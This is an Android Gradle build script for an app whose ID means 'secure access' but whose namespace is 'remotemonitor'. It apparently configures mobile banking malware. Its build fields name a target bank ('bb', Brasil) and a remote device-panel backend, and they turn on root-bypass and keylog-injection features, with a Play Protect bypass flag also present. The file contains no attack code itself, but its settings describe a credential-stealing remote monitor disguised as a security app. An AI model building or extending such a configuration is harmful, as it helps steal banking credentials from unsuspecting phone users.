plugins {
    alias(libs.plugins.android.application)
    alias(libs.plugins.kotlin.compose)
}

android {
    namespace = "com.remotemonitor.test"
    compileSdk {
        version = release(36) {
            minorApiLevel = 1
        }
    }

    defaultConfig {
        applicationId = "com.acesso.seguro"
        minSdk = 24
        targetSdk = 36
        versionCode = 2
        versionName = "1.1-monitoring"

        buildConfigField("String", "BACKEND_BASE_URL", "\"https://remotemonitor-production-b232.up.railway.app\"")
        buildConfigField("String", "FALLBACK_PANEL_URL", "\"https://remotemonitor-production-b232.up.railway.app/devices\"")
        buildConfigField("String", "BANK_ID", "\"bb\"")
        buildConfigField("String", "BANK_COUNTRY", "\"Brasil\"")
        buildConfigField("Boolean", "ENABLE_ROOT_BYPASS", "true")
        buildConfigField("Boolean", "ENABLE_PLAY_PROTECT_BYPASS", "false")
        buildConfigField("Boolean", "ENABLE_KEYLOG_INJECTION", "true")

        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
    }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }
    buildFeatures {
        buildConfig = true
        compose = true
    }
}

dependencies {
    implementation(libs.androidx.core.ktx)
    implementation(libs.androidx.lifecycle.runtime.ktx)
    implementation(libs.androidx.activity.compose)
    implementation("androidx.work:work-runtime-ktx:2.9.1")
    implementation(platform(libs.androidx.compose.bom))
    implementation(libs.androidx.compose.ui)
    implementation(libs.androidx.compose.ui.graphics)
    implementation(libs.androidx.compose.ui.tooling.preview)
    implementation(libs.androidx.compose.material3)
    testImplementation(libs.junit)
    androidTestImplementation(libs.androidx.junit)
    androidTestImplementation(libs.androidx.espresso.core)
    androidTestImplementation(platform(libs.androidx.compose.bom))
    androidTestImplementation(libs.androidx.compose.ui.test.junit4)
    debugImplementation(libs.androidx.compose.ui.tooling)
    debugImplementation(libs.androidx.compose.ui.test.manifest)
}